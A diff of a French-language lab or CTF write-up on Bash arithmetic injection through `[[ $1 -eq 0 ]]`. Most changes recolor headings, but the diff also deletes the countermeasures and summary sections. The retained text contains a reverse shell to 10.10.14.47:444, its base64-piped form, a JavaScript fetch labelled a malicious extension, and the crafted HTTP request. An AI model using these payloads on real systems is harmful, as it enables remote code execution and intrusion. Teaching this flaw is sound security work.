@@ -28,7 +28,7 @@ if [[ "$1" -eq 0 ]]; then
 
 ### <mark style="color:blue;">**2. POURQUOI C'EST VULNÉRABLE ?**</mark>
 
-#### **2.1 Comportement Normal Attendu**
+#### <mark style="color:green;">**2.1 Comportement Normal Attendu**</mark>
 
 On pourrait penser que cette ligne fait simplement :
 
@@ -46,7 +46,7 @@ On pourrait penser que cette ligne fait simplement :
 
 ***
 
-#### **2.2 Le Vrai Comportement de Bash**
+#### <mark style="color:green;">**2.2 Le Vrai Comportement de Bash**</mark>
 
 **🔥 CRITICAL : Bash ne traite PAS `$1` comme une simple chaîne de caractères !**
 
@@ -56,7 +56,7 @@ Quand Bash voit l'opérateur arithmétique `-eq`, il **évalue l'opérande comme
 
 ### <mark style="color:blue;">**3. QU'EST-CE QU'UNE EXPRESSION ARITHMÉTIQUE EN BASH ?**</mark>
 
-#### **3.1 Définition**
+#### <mark style="color:green;">**3.1 Définition**</mark>
 
 Une expression arithmétique en Bash peut contenir :
 
@@ -67,7 +67,7 @@ Une expression arithmétique en Bash peut contenir :
 * Des **tableaux** : `array[0]`, `data[index]`
 * Des **substitutions de commandes** : `$(command)`
 
-#### **3.2 Exemples d'Expressions Arithmétiques Valides**
+#### <mark style="color:green;">**3.2 Exemples d'Expressions Arithmétiques Valides**</mark>
 
 ```bash
 # Simple
@@ -91,7 +91,7 @@ a=10
 
 ### <mark style="color:blue;">**4. EXPLOITATION : TABLEAUX ET SUBSTITUTION DE COMMANDES**</mark>
 
-#### **4.1 Les Tableaux en Bash**
+#### <mark style="color:green;">**4.1 Les Tableaux en Bash**</mark>
 
 Syntaxe d'un tableau :
 
@@ -116,7 +116,7 @@ data[x]=50              # Si x=3, alors data[3] = 50
 
 ***
 
-#### **4.2 Substitution de Commandes dans les Indices**
+#### <mark style="color:green;">**4.2 Substitution de Commandes dans les Indices**</mark>
 
 **Bash permet :**
 
@@ -149,7 +149,7 @@ Done
 
 ***
 
-#### **4.3 Pourquoi ça Fonctionne dans `-eq` ?**
+#### <mark style="color:green;">**4.3 Pourquoi ça Fonctionne dans**</mark><mark style="color:green;">**&#x20;**</mark><mark style="color:green;">**`-eq`**</mark><mark style="color:green;">**&#x20;**</mark><mark style="color:green;">**?**</mark>
 
 Quand on écrit :
 
@@ -185,7 +185,7 @@ if [[ a[$(whoami)] -eq 0 ]]; then
 
 ### <mark style="color:blue;">**5. POURQUOI**</mark><mark style="color:blue;">**&#x20;**</mark><mark style="color:blue;">**`a[...]`**</mark><mark style="color:blue;">**&#x20;**</mark><mark style="color:blue;">**ET PAS JUSTE**</mark><mark style="color:blue;">**&#x20;**</mark><mark style="color:blue;">**`[...]`**</mark><mark style="color:blue;">**&#x20;**</mark><mark style="color:blue;">**?**</mark>
 
-#### **5.1 Test sans le préfixe `a`**
+#### <mark style="color:green;">**5.1 Test sans le préfixe**</mark><mark style="color:green;">**&#x20;**</mark><mark style="color:green;">**`a`**</mark>
 
 ```bash
 #!/bin/bash
@@ -217,7 +217,7 @@ OK
 
 ***
 
-#### **5.3 Explication**
+#### <mark style="color:green;">**5.3 Explication**</mark>
 
 **Sans `a` :**
 
@@ -245,7 +245,7 @@ bar[$(whoami)]    # ✅ Fonctionne
 
 ### <mark style="color:blue;">**6. EXPLOITATION COMPLÈTE ÉTAPE PAR ÉTAPE**</mark>
 
-#### **6.1 Payload Simple : Preuve de Concept**
+#### <mark style="color:green;">**6.1 Payload Simple : Preuve de Concept**</mark>
 
 **Objectif :** Prouver qu'on peut exécuter `whoami`
 
@@ -307,7 +307,7 @@ bash -c 'bash -i >& /dev/tcp/10.10.14.47/444 0>&1'
 
 ***
 
-#### **6.3 Encodage en Base64**
+#### <mark style="color:green;">**6.3 Encodage en Base64**</mark>
 
 **Solution :** Encoder la commande en base64
 
@@ -335,7 +335,7 @@ a[$(echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40Ny80NDQgMD4mMSc=|ba
 
 ### <mark style="color:blue;">**7. DÉROULEMENT COMPLET DE L'EXPLOITATION**</mark>
 
-#### **7.1 Depuis JavaScript (Extension Malveillante)**
+#### <mark style="color:green;">**7.1 Depuis JavaScript (Extension Malveillante)**</mark>
 
 ```javascript
 const TARGET = "http://127.0.0.1:5000/routines/";
@@ -358,7 +358,7 @@ fetch(TARGET + exploit, { mode: "no-cors" });
 
 ***
 
-#### **7.2 Requête HTTP Envoyée**
+#### <mark style="color:green;">**7.2 Requête HTTP Envoyée**</mark>
 
 ```http
 GET /routines/a[$(echo%20YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40Ny80NDQgMD4mMSc=|base64%20-d|bash)] HTTP/1.1
@@ -367,7 +367,7 @@ Host: 127.0.0.1:5000
 
 ***
 
-#### **7.3 Traitement côté Serveur**
+#### <mark style="color:green;">**7.3 Traitement côté Serveur**</mark>
 
 **1. Flask reçoit la requête :**
 
@@ -406,7 +406,7 @@ if [[ "a[$(echo YmFz...|base64 -d|bash)]" -eq 0 ]]; then
 
 ***
 
-#### **7.4 Évaluation Arithmétique par Bash**
+#### <mark style="color:green;">**7.4 Évaluation Arithmétique par Bash**</mark>
 
 **Étape 1 : Bash reconnaît `a[...]` comme un tableau**
 
@@ -446,7 +446,7 @@ bash -i >& /dev/tcp/10.10.14.47/444 0>&1
 
 ### <mark style="color:blue;">**8. POURQUOI C'EST SI DANGEREUX ?**</mark>
 
-#### **8.1 Contournement de subprocess.run()**
+#### <mark style="color:green;">**8.1 Contournement de subprocess.run()**</mark>
 
 Python utilise :
 
@@ -467,7 +467,7 @@ subprocess.run(["./routines.sh", rid])
 
 ***
 
-#### **8.2 Absence de Validation**
+#### <mark style="color:green;">**8.2 Absence de Validation**</mark>
 
 Le code ne valide PAS `$1` :
 
@@ -483,7 +483,7 @@ if [[ "$1" -eq 0 ]]; then  # ← Aucun filtrage !
 
 ***
 
-#### **8.3 Exécution en Contexte Privilégié**
+#### <mark style="color:green;">**8.3 Exécution en Contexte Privilégié**</mark>
 
 Si le script tourne avec `sudo` ou en tant que root :
 
@@ -499,103 +499,7 @@ sudo ./routines.sh 'a[$(whoami)]'
 
 ***
 
-### <mark style="color:blue;">**9. CONTRE-MESURES**</mark>
-
-#### **9.1 Validation Stricte avec Regex**
-
-```bash
-#!/bin/bash
-
-# Valider que $1 est un nombre
-if ! [[ "$1" =~ ^[0-9]+$ ]]; then
-    echo "Error: Invalid input"
-    exit 1
-fi
-
-# Maintenant sûr d'utiliser -eq
-if [[ "$1" -eq 0 ]]; then
-    echo "Routine 0"
-fi
-```
-
-**L'opérateur `=~` ne fait PAS d'évaluation arithmétique !**
-
-***
-
-#### **9.2 Utiliser `[ ]` au lieu de `[[ ]]`**
-
-```bash
-#!/bin/bash
-if [ "$1" -eq 0 ]; then
-    echo "Routine 0"
-fi
-```
-
-**Différence :**
-
-* `[ ]` : Commande externe `/usr/bin/[`
-* `[[ ]]` : Builtin bash avec évaluation arithmétique
-
-**Test :**
-
-```bash
-$ ./test.sh 'a[$(whoami)]'
-./test.sh: line 2: [: a[larry]: integer expression expected
-```
-
-**✅ Erreur mais pas d'exécution de commande !**
-
-***
-
-#### **9.3 Éviter les Opérateurs Arithmétiques**
-
-**Au lieu de :**
-
-```bash
-if [[ "$1" -eq 0 ]]; then
-```
-
-**Utiliser des comparaisons de chaînes :**
-
-```bash
-if [[ "$1" == "0" ]]; then
-```
-
-***
-
-#### **9.4 Ne JAMAIS Faire Confiance aux Inputs Externes**
-
-**Principe fondamental :**
-
-* Tout input utilisateur est **malveillant par défaut**
-* Valider avec whitelist, pas blacklist
-* Échapper/sanitiser avant utilisation
-
-***
-
-### **10. RÉSUMÉ TECHNIQUE**
-
-#### **Chaîne d'Exploitation :**
-
-```
-1. Input utilisateur non validé
-   ↓
-2. Passé à opérateur arithmétique -eq
-   ↓
-3. Bash évalue comme expression arithmétique
-   ↓
-4. Reconnaissance de syntaxe tableau a[...]
-   ↓
-5. Évaluation de l'indice [...]
-   ↓
-6. Substitution de commande $(...)
-   ↓
-7. Exécution de code arbitraire
-   ↓
-8. Reverse shell / Escalade de privilèges
-```
-
-#### **Syntaxes Vulnérables :**
+#### <mark style="color:green;">**Syntaxes Vulnérables :**</mark>
 
 | Syntaxe             | Vulnérable ? | Raison                             |
 | ------------------- | ------------ | ---------------------------------- |
@@ -608,5 +512,3 @@ if [[ "$1" == "0" ]]; then
 | `[[ $var == "N" ]]` | ❌ Non        | Comparaison de chaînes             |
 
 ***
-
-Voilà l'explication complète et détaillée de cette faille arithmétique ! 🎯
